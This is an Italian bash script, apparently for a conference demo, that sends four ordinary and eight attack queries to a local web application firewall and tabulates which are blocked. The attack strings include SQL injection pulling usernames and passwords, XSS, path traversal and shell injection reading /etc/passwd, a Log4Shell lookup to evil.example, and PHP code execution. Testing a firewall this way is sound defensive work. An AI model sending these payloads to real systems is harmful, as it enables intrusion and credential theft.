#!/usr/bin/env bash
# Una raffica di richieste contro il profilo acceso, in tabella: esito, codice
# di risposta, cosa e', e il valore del parametro q della richiesta, in chiaro.
# Sul filo curl lo codifica (%27 per ', + per lo spazio...), ma il WAF lo
# decodifica prima di applicare le regole.
# Pensata per il palco: dura un secondo.
#   make block && make raffica
set -u
URL=http://localhost:8080

# colori pensati per un terminale a sfondo nero: niente grigio scuro
VERDE=$'\e[1;92m'; ROSSO=$'\e[1;91m'; TENUE=$'\e[37m'; BIANCO=$'\e[1;97m'; AZZURRO=$'\e[1;96m'; GRASSETTO=$'\e[1m'; FINE=$'\e[0m'
W1=8; W2=4; W3=26; W4=46   # larghezze delle colonne

linea() { # sinistra, incrocio, destra
  local s="$1" c
  for w in $W1 $W2 $W3 $W4; do s+=$(printf '─%.0s' $(seq 1 $((w+2)))); s+="$2"; done
  printf "  %s%s%s\n" "$TENUE" "${s%?}$3" "$FINE"
}
cella() { printf " %-*s ${TENUE}│${FINE}" "$1" "$2"; }

PASSANO=0; BLOCCATE=0
prova() { # cosa e', valore di q
  local code esito colore
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 --get --data-urlencode "q=$2" "$URL/search")
  if [ "$code" = 200 ]; then esito=passa; colore=$VERDE; PASSANO=$((PASSANO+1)); else esito=bloccata; colore=$ROSSO; BLOCCATE=$((BLOCCATE+1)); fi
  printf "  ${TENUE}│${FINE}%s%s%s%s\n" "$colore$(cella $W1 "$esito")" "$(cella $W2 "$code")" "$(cella $W3 "$1")" "$BIANCO$(cella $W4 "$2")"
}
gruppo() { printf "  ${TENUE}│${FINE} ${AZZURRO}%-*s${FINE} ${TENUE}│${FINE}\n" $((W1+W2+W3+W4+9)) "$1"; }

echo "${AZZURRO}» mando dodici richieste a $URL/search?q=…${FINE}"
echo ""
linea "┌" "┬" "┐"
printf "  ${TENUE}│${FINE}%s%s%s%s\n" "$BIANCO$(cella $W1 ESITO)" "$BIANCO$(cella $W2 HTTP)" "$BIANCO$(cella $W3 COSA)" "$BIANCO$(cella $W4 'GET /search?q=')"
linea "├" "┴" "┤"
gruppo "quattro richieste oneste"
linea "├" "┬" "┤"
prova "una ricerca"                "tastiera meccanica"
prova "un cognome con apostrofo"   "O'Reilly"
prova "un libro di SQL"            "SELECT * FROM menu"
prova "un libro di programmazione" "C++ & C# -- guida"
linea "├" "┴" "┤"
gruppo "otto attacchi"
linea "├" "┬" "┤"
prova "SQL injection"              "1' OR 1=1--"
prova "SQL injection, UNION"       "' UNION SELECT username, password FROM users--"
prova "XSS"                        "<script>alert(1)</script>"
prova "XSS da un'immagine"         "<img src=x onerror=alert(1)>"
prova "file di sistema"            "../../../../etc/passwd"
prova "comando di shell"           "; cat /etc/passwd"
prova "Log4Shell"                  '${jndi:ldap://evil.example/a}'
prova "codice PHP"                 "<?php system('id'); ?>"
linea "└" "┴" "┘"
echo ""
echo "${AZZURRO}» passano ${VERDE}$PASSANO${AZZURRO}, bloccate ${ROSSO}$BLOCCATE${FINE}"
echo ""
